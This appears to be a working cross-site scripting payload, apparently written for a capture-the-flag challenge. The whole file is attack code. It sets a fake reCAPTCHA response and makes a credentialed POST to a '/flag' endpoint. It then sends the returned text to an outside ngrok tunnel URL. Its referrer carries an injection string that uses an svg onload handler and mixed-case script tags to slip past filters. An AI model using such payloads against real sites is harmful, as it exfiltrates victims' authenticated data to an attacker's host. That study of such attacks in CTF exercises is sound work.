document.getElementById('g-recaptcha-response').innerHTML = 'test';
fetch('http://65.108.152.108:5000/flag', {
    'headers': {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'pragma': 'no-cache',
        'upgrade-insecure-requests': '1'
    },
    'referrer': 'http://65.108.152.108:5000/?msg[]=%3C/scripT%20&msg[]=%3C/script%3E&msg[]=%3Csvg%20onload=',
    'referrerPolicy': 'strict-origin-when-cross-origin',
    'body': 'g-recaptcha-response=test',
    'method': 'POST',
    'mode': 'cors',
    'credentials': 'include'
}).then(res => res.text()).then(r => document.location = 'https://b342-103-93-37-30.ngrok.io/?x=' + r);